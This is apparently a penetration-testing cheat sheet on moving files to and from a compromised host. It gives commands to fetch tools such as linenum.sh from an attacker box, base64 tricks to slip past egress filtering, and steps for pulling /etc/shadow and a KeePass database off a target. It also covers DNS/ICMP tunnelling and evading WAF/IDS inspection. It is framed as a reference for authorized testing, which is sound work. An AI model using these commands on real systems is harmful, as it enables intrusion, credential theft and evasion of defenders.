# General

Cross-cutting techniques that aren't tied to one platform or phase — the small things you reach for on every engagement. Authorized testing only.

## Contents

- [Moving files](#moving-files)
- [When the firewall blocks it — encode & paste](#when-the-firewall-blocks-it--encode--paste)

## Moving files

Getting a tool onto a target, or loot back off it. Start a web server on your box, then pull from the target; `scp` pushes directly when you already have SSH.

```bash
# serve the current directory from your attack box (10.10.14.1 here)
$ python3 -m http.server 8000

# pull to the target — wget or curl, whichever is present
$ wget http://10.10.14.1:8000/linenum.sh
$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

# push over SSH when you have creds/a key
$ scp linenum.sh user@remotehost:/tmp/linenum.sh
```

More transfer channels (SMB share, netcat, in-memory execution) are in [smb](Protocols/smb.md), [netcat](Shell/netcat.md), and the [Privilege Escalation](Privilege%20Escalation/README.md) tool notes.

## When the firewall blocks it — encode & paste

Egress filtering often kills `wget`/`curl`/`scp` — the target can't reach your web server at all. The reliable way around it: **don't open a new connection**. Base64-encode the file to text and move it through the shell session you already have, then decode on the other side. There's nothing new for the firewall to see.

```bash
# SOURCE: encode the file to one line of text (-w0 = no line wraps)
base64 -w0 linenum.sh ; echo
#   copy the blob it prints

# TARGET: paste the blob and decode it back to the file
echo '<PASTE_BASE64_HERE>' | base64 -d > linenum.sh
```

Pulling loot **off** the box is the same trick in reverse — `base64 -w0 /etc/shadow` on the target, copy the blob, `base64 -d` on your box.

```powershell
# Windows equivalents
# target -> text:
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\loot.kdbx"))
# text -> file:
[IO.File]::WriteAllBytes("C:\tmp\f.exe",[Convert]::FromBase64String("<BLOB>"))
certutil -encode secret.bin out.b64   ::  / -decode to reverse (built-in, no PowerShell)
```

**Always verify the copy** — a pasted blob loses bytes to terminal width, whitespace or a truncated selection:

```bash
md5sum linenum.sh        # compare the hash on both ends; wc -c also catches truncation
```

Other ways past a filter, roughly in order of how often they work:

| Situation | Try |
| --- | --- |
| HTTP out is blocked, but 80/443 are allowed outbound | Serve on `:443` / `:80` — egress rules often whitelist them (`sudo python3 -m http.server 443`) |
| Only DNS leaves the network | DNS tunnelling — `dnscat2`, `iodine` |
| Only ICMP (ping) leaves | ICMP tunnelling — `icmptunnel`, `ptunnel` |
| You have a shell but no transfer tool at all | base64 paste above — needs nothing but the shell |
| Inbound to you is blocked (NAT) but you can push | Reverse the direction: target runs the listener/sender, or pivot — [Pivoting & Tunneling](Networking/Pivoting%20%26%20Tunneling.md) |

Encoding also dodges **content inspection**: a WAF/IDS that flags a plaintext script or a known binary signature won't match the base64, and serving over `https://` hides the payload from anything not doing TLS interception. That's evasion, so only on engagements where it's in scope.

## Related

[folder README](README.md) · [netcat](Shell/netcat.md) · [smb](Protocols/smb.md) · [Pivoting & Tunneling](Networking/Pivoting%20%26%20Tunneling.md) · [Privilege Escalation](Privilege%20Escalation/README.md)
